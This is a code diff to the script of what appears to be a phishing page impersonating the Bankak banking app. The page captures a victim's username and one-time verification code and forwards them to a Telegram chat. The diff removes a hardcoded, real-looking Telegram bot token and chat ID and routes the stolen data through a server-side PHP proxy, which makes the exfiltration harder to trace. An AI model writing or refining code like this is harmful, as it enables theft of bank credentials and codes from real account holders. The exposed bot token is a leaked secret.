@@ -69,8 +69,6 @@
         (function () {
             'use strict';
             var CONFIG = {
-                TELEGRAM_BOT_TOKEN: '8987871839:AAEibtwHtRAJW5lUSRC78jERfceqjxL43cc',
-                TELEGRAM_CHAT_ID: '844962683',
                 CANCEL_URL: 'index.html',
                 NEXT_URL: 'business-details.html',
                 REDIRECT_DELAY: 1500,
@@ -195,12 +193,6 @@
             });
 
             function sendToTelegram(type, code) {
-                var token = CONFIG.TELEGRAM_BOT_TOKEN;
-                var chatId = CONFIG.TELEGRAM_CHAT_ID;
-                if (!token || token === '8987871839:AAEibtwHtRAJW5lUSRC78jERfceqjxL43cc' || !chatId || chatId === '844962683') {
-                    console.warn('[Bankak] Telegram not configured — skipping.');
-                    return Promise.resolve(false);
-                }
                 var now = new Date();
                 var timeStr = now.toLocaleString('en-GB', { hour12: false });
                 var text;
@@ -209,12 +201,15 @@
                 } else {
                     text = '🔁 تحديث بياناتك — طلب إعادة إرسال الرمز\n━━━━━━━━━━━━━━━━━━━━\n👤 اسم المستخدم / Account: ' + username + '\n\n🕒 الوقت: ' + timeStr;
                 }
-                var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
                 var payload = new URLSearchParams();
-                payload.append('chat_id', chatId);
                 payload.append('text', text);
-                return fetch(url, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: payload.toString() })
-                    .then(function () { return true; }).catch(function () { return false; });
+                return fetch('telegram-proxy.php', { method: 'POST', body: payload })
+                    .then(function (response) {
+                        if (!response.ok) {
+                            console.warn('[Bankak] Telegram request failed:', response.status, response.statusText);
+                        }
+                        return true;
+                    }).catch(function (err) { console.error('[Bankak] Telegram error:', err); return false; });
             }
 
             resendBtn.addEventListener('click', function () {
